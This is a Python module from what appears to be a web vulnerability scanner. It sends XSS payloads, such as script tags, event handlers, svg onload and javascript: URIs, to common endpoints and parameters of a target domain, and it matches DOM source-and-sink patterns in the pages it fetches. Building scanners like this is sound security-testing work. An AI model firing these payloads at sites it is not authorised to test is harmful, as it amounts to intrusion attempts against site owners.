"""
Trace Foundry V4 - XSS Scanner
Anti false-positive: verifies actual reflection in response
Tests: Reflected XSS, DOM XSS indicators, stored XSS endpoints
"""

import urllib.request
import urllib.error
import urllib.parse
import re
from utils.display import section, ok, warn, info, detail, bug_found

# XSS Payloads — ordered from least to most aggressive
XSS_PAYLOADS = [
    # Basic reflection test (no actual execution)
    ('<tfv4marker>', 'tfv4marker'),
    # Script tag
    ('<script>alert(1)</script>', '<script>alert(1)</script>'),
    # Event handlers
    ('" onmouseover="alert(1)"', 'onmouseover='),
    ("' onerror='alert(1)'",     'onerror='),
    # JavaScript URI
    ('javascript:alert(1)',       'javascript:alert'),
    # SVG
    ('<svg onload=alert(1)>',     'svg onload'),
    # IMG onerror
    ('<img src=x onerror=alert(1)>', 'onerror=alert'),
    # Template literal
    ('${7*7}',                    '49'),
    # HTML entity bypass
    ('&lt;script&gt;alert(1)&lt;/script&gt;', None),
    # Double encoding
    ('%3Cscript%3Ealert(1)%3C/script%3E', None),
]

# DOM XSS source patterns in HTML/JS
DOM_XSS_SOURCES = [
    r'document\.URL',
    r'document\.location',
    r'document\.referrer',
    r'window\.location',
    r'location\.href',
    r'location\.hash',
    r'location\.search',
]

DOM_XSS_SINKS = [
    r'document\.write\s*\(',
    r'innerHTML\s*=',
    r'outerHTML\s*=',
    r'eval\s*\(',
    r'setTimeout\s*\(',
    r'setInterval\s*\(',
    r'\.html\s*\(',        # jQuery .html()
    r'\.append\s*\(',      # jQuery .append()
    r'insertAdjacentHTML\s*\(',
]

PARAM_NAMES = [
    "q","search","s","query","keyword","name","input","text","msg","message",
    "comment","title","content","data","value","ref","url","redirect","next",
    "page","id","cat","type","lang","user","username","email",
]

TEST_ENDPOINTS = [
    "/","  /search","/api/search","/comments","/feedback",
    "/contact","/api/v1/search","/forum","/blog",
]

CONTEXT_PATTERNS = {
    "html_attr":  re.compile(r'<[^>]+=["\'][^"\']*{marker}', re.I),
    "html_body":  re.compile(r'<[^/][^>]*>[^<]*{marker}', re.I),
    "js_string":  re.compile(r'["\'][^"\']*{marker}[^"\']*["\']', re.I),
    "unencoded":  re.compile(r'(?<!&lt;)(?<!%3C){marker}(?!&gt;)(?!%3E)', re.I),
}

class XSSModule:
    def __init__(self, domain, timeout=6):
        self.domain  = domain
        self.timeout = timeout
        self.headers = {
            "User-Agent":      "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Accept":          "text/html,application/xhtml+xml,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.5",
        }

    def _fetch(self, url, method="GET", post_data=None):
        try:
            req = urllib.request.Request(url, data=post_data,
                                         headers=self.headers, method=method)
            with urllib.request.urlopen(req, timeout=self.timeout) as r:
                return r.read(65536).decode("utf-8", errors="ignore"), r.status
        except urllib.error.HTTPError as e:
            try:    body = e.read(32768).decode("utf-8", errors="ignore")
            except: body = ""
            return body, e.code
        except:
            return "", 0

    def _check_reflection(self, body, payload, marker):
        """Check if payload or marker actually reflected unencoded"""
        if not body or not marker:
            return False, "no_marker"
        body_lower = body.lower()
        marker_lower = marker.lower()
        if marker_lower not in body_lower:
            return False, "not_reflected"
        # Check if it's encoded (false positive prevention)
        encoded = urllib.parse.quote(marker).lower()
        if encoded in body_lower and marker_lower not in body_lower.replace(encoded, ""):
            return False, "encoded_only"
        return True, "reflected_unencoded"

    def _detect_context(self, body, marker):
        """Detect injection context for better reporting"""
        for ctx_name, pattern in CONTEXT_PATTERNS.items():
            pat = pattern.pattern.replace("{marker}", re.escape(marker))
            if re.search(pat, body, re.I):
                return ctx_name
        return "unknown"

    def _test_reflected_xss(self, base_url, param):
        bugs = []
        # First check: does parameter reflect at all?
        probe = "tfv4xss12345"
        test_url = f"{base_url}?{param}={probe}"
        body, status = self._fetch(test_url)
        if not body or probe not in body:
            return bugs  # param not reflected, skip

        info(f"  Param '{param}' reflects input → testing XSS payloads...")

        for payload, marker in XSS_PAYLOADS:
            if marker is None:
                continue
            enc_payload = urllib.parse.quote(payload)
            test_url = f"{base_url}?{param}={enc_payload}"
            body, status = self._fetch(test_url)
            reflected, reason = self._check_reflection(body, payload, marker)
            if reflected:
                context = self._detect_context(body, marker)
                bugs.append({
                    "type":     "Cross-Site Scripting (Reflected XSS)",
                    "severity": "HIGH",
                    "url":      test_url,
                    "param":    param,
                    "payload":  payload,
                    "context":  context,
                    "evidence": f"Marker '{marker}' found unencoded in response",
                    "detail":   f"Payload reflected in {context} context. Attacker can execute JS in victim browser.",
                })
                break  # one confirmed per param is enough

        return bugs

    def _test_dom_xss(self, url):
        """Check for DOM XSS patterns in JS/HTML source"""
        bugs = []
        body, status = self._fetch(url)
        if not body:
            return bugs

        sources_found = []
        sinks_found   = []

        for src in DOM_XSS_SOURCES:
            if re.search(src, body):
                sources_found.append(src.replace("\\.", ".").replace("\\s*", ""))

        for sink in DOM_XSS_SINKS:
            if re.search(sink, body):
                sinks_found.append(sink.replace("\\s*", "").replace("\\(","("))

        if sources_found and sinks_found:
            bugs.append({
                "type":     "DOM XSS Indicator (Source → Sink)",
                "severity": "MEDIUM",
                "url":      url,
                "sources":  ", ".join(sources_found[:3]),
                "sinks":    ", ".join(sinks_found[:3]),
                "evidence": f"{len(sources_found)} DOM sources + {len(sinks_found)} dangerous sinks detected",
                "detail":   "User-controlled data flows into dangerous DOM sinks. Manual verification needed.",
            })
        return bugs

    def _test_post_xss(self, base_url):
        """Test XSS via POST parameters"""
        bugs = []
        payload = "<tfv4xss>"
        marker  = "tfv4xss"
        for param in ["q", "search", "comment", "message", "content", "text", "name"]:
            post_data = urllib.parse.urlencode({param: payload}).encode()
            body, status = self._fetch(base_url, method="POST", post_data=post_data)
            if body and marker in body.lower():
                bugs.append({
                    "type":     "Cross-Site Scripting (POST Reflected XSS)",
                    "severity": "HIGH",
                    "url":      base_url,
                    "param":    param,
                    "payload":  payload,
                    "method":   "POST",
                    "evidence": f"POST param '{param}' reflects unencoded HTML tags",
                    "detail":   "POST data reflected without sanitization — XSS possible",
                })
        return bugs

    def run(self):
        section("XSS Scanner (Reflected | DOM | POST)")
        all_bugs = []

        for endpoint in TEST_ENDPOINTS:
            endpoint = endpoint.strip()
            for scheme in ["https", "http"]:
                base_url = f"{scheme}://{self.domain}{endpoint}"
                body, status = self._fetch(base_url)
                if status == 0:
                    continue

                info(f"Testing: {base_url}")

                # DOM XSS check on every page
                dom_bugs = self._test_dom_xss(base_url)
                for b in dom_bugs:
                    bug_found(b["type"], b["severity"], {
                        "URL":      b["url"],
                        "Sources":  b.get("sources",""),
                        "Sinks":    b.get("sinks",""),
                        "Evidence": b["evidence"],
                        "Impact":   "JS execution in victim browser if exploited",
                    })
                all_bugs.extend(dom_bugs)

                # Reflected XSS per param
                for param in PARAM_NAMES[:10]:
                    bugs = self._test_reflected_xss(base_url, param)
                    for b in bugs:
                        bug_found(b["type"], b["severity"], {
                            "URL":      b["url"],
                            "Param":    b["param"],
                            "Payload":  b["payload"],
                            "Context":  b.get("context",""),
                            "Evidence": b["evidence"],
                            "Impact":   "JS execution in victim browser — session hijack, defacement",
                        })
                    all_bugs.extend(bugs)

                # POST XSS
                post_bugs = self._test_post_xss(base_url)
                for b in post_bugs:
                    bug_found(b["type"], b["severity"], {
                        "URL":     b["url"],
                        "Param":   b["param"],
                        "Method":  b["method"],
                        "Payload": b["payload"],
                        "Impact":  "Attacker can inject scripts via form submissions",
                    })
                all_bugs.extend(post_bugs)

                break

        deduped = {b["url"]+b.get("param",""):b for b in all_bugs}
        all_bugs = list(deduped.values())

        info(f"XSS scan complete — {len(all_bugs)} confirmed findings")
        if not all_bugs:
            ok("No XSS found (reflection-verified) ✓")
        return {"bugs": all_bugs}
